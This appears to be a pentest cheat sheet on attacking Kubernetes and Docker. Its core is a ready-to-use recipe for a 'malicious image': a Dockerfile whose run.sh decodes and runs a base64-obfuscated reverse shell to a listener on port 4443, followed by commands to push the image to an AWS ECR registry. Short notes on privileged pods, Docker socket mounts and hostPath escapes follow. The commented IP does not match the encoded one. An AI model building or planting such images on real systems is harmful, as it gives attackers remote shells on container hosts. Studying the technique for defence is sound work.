# Kubernetes / Docker

## Kubernetes

Privileged Pod: A pod with `securityContext.privileged: true` (or container-level) can do nearly anything on the node — can mount host filesystems, access host network, and potentially escape container isolation.

## Docker

### Create a malicious image

Useful to upload to a registry / Kubernetes cluster / etc

```
$:/tmp/dockerrev$ cat Dockerfile 
FROM nginx                                                                                    
COPY run.sh /run.sh
RUN chmod +x /run.sh && apt-get update -y && apt-get install -y cl-base64
CMD ["/run.sh"]
$:/tmp/dockerrev$ cat run.sh 
# echo '/bin/sh -i >& /dev/tcp/10.10.10.14/4443 0>&1' | base64
echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEwLjEyLzQ0NDMgMD4mMQ== | base64 -d | bash

docker build -t dockerrev . -f Dockerfile

docker tag dockerrev:latest <registry-id>.dkr.ecr.us-east-1.amazonaws.com/<repository-id>:latest

# Login to AWS ECR (rights permissions needed)
aws ecr get-login-password --region us-east-1 | sudo docker login --username AWS --password-stdin <registry-id>.dkr.ecr.us-east-1.amazonaws.com
# And then push the image
sudo docker push <registry-id>.dkr.ecr.us-east-1.amazonaws.com/<repository-id>:latest
```


- Containers running with `--privileged` or with mounted Docker socket allowing effective host control
- HostPath mounts exposing sensitive directories
- SUID binaries / dangerous capabilities
